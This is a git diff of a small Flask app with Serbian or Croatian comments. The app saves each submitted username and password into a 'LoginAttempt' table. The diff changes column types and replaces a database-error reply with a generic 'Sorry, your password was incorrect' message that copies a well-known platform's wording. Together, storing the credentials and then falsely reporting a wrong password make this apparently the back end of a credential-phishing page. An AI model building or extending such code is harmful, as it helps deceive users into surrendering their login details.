@@ -20,8 +20,8 @@ db = SQLAlchemy(app)
 
 class LoginAttempt(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.Text, nullable=False)  # ✅ TEXT umesto VARCHAR zbog dužine
-    password = db.Column(db.Text, nullable=False)  # ✅ TEXT za dugačke hashove
+    username = db.Column(db.String(150), nullable=False)
+    password = db.Column(db.String(255), nullable=False)  # ✅ Povećana dužina za hashovanje
 
 # ✅ Kreiranje tabele
 with app.app_context():
@@ -38,11 +38,9 @@ def submit():
 
     if not username or not password:
         return jsonify({"message": "Sva polja su obavezna!", "status": "error"})
-    
-    try:
-        hashed_password = generate_password_hash(password)
-        print(f"🔍 Dužina hashovane lozinke: {len(hashed_password)}")  # ✅ Debug
 
+    try:
+        hashed_password = generate_password_hash(password)  # ✅ Hashovanje radi sigurnosti
         new_attempt = LoginAttempt(username=username, password=hashed_password)
         db.session.add(new_attempt)
         db.session.commit()
@@ -50,7 +48,7 @@ def submit():
     except SQLAlchemyError as e:
         db.session.rollback()
         print(f"❌ Greška pri upisu u bazu: {e}")
-        return jsonify({"message": "Greška pri čuvanju podataka. Pokušajte ponovo.", "status": "error"})
+        return jsonify({"message": "Sorry, your password was incorrect. Please double-check your password.", "status": "error"})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))
